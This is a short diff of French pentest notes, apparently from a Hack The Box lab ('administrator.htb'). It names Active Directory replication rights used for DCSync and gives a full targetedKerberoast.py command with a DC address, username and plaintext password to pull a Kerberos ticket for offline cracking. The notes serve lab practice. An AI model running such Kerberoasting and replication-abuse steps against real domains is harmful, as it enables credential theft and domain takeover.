@@ -3,6 +3,7 @@ Identifier les droits
 1. DS-Replication-Get-change-All
 2. DS-Replication-Get-change
 
+
 Récupération du TGS du user ayant les droits sur la délégation de replication AD
 ```
 python3 targetedKerberoast.py --dc-ip 10.129.41.212 -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
